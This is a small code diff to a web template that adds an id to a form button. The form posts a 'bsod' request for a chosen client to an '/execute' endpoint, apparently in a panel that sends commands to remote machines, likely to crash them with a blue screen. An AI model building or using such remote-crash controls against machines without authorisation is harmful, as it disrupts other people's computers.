@@ -44,7 +44,7 @@
     <form class="box-content" action="/execute" method="post">
       <input type="hidden" name="client_id" value="<%= $clientsList[params[:client].to_i].id %>">
       <input type="hidden" name="request" value="bsod">
-      <button type="submit">
+      <button type="submit" id="bsod-button">
       <div class="icon-div">
         <i class="fa-solid fa-bug fa-2xl"></i>
       </div>
